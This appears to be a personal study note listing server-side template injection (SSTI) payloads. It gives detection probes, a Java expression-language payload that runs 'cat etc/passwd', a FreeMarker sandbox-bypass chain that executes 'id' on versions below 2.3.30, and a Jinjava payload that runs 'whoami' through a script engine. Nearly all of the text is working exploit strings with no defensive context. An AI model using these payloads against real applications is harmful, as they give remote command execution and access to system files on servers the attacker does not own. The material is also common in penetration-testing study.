Daily Notes : Day 49 
SSTI PAYLOADS - Part 1

Detection:

{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}

Retrieve /etc/passwd : 
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

Freemarker - Sandbox bypass
only works on Freemarker versions below 2.3.30
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}

JinjaJava :
{{'a'.toUpperCase()}} would result in 'A'

Jinjava - Command execution : 
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}